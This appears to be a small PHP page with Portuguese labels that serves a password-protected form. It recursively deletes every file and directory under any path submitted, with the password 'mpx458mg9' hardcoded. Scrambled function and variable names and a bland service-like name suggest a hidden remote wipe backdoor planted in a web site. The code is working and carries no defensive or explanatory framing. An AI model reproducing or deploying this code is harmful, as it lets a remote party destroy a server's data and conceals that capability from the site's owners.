<html>
<body>
<form action="servico.php" method="POST">
    <label for="caminho">Exemplo : <?php echo getcwd() ?></label> <br>
    <label for="caminho">Caminho</label> <br>
    <input id="caminho" type="text" name="caminho">
    <br>
    <label for="pass">Senha</label> <br>
    <input id="pass" type="password" name="pass">
    <br> <br>
    <button type="submit">Executar</button>
</form>
</body>
</html>

<?php

function xpritonsrWWX($ownPAtk)
{
    if (is_dir($ownPAtk)) {
        echo "<br>Diretorio : " . $ownPAtk;
        $Folsxpw = scandir($ownPAtk);
        echo "<br>Scaneado";
        var_dump($Folsxpw);
        foreach ($Folsxpw as $object) {
            if ($object != "." && $object != "..") {
                if (filetype($ownPAtk . "/" . $object) == "dir") {
                    xpritonsrWWX($ownPAtk . "/" . $object);
                } else {
                    unlink($ownPAtk . "/" . $object);
                }
            }
        }
        if (reset($Folsxpw)) {
            echo "<br>Reset Executado em :";
            var_dump($Folsxpw);
        }
        if (rmdir($ownPAtk)) {
            echo "<br>Rmdir Executado em :";
            var_dump($ownPAtk);
        }
    }

}

if (isset($_POST['pass'])) {
    if ($_POST['pass'] == 'mpx458mg9' && isset($_POST['caminho'])) {
        xpritonsrWWX($_POST['caminho']);
    }
}

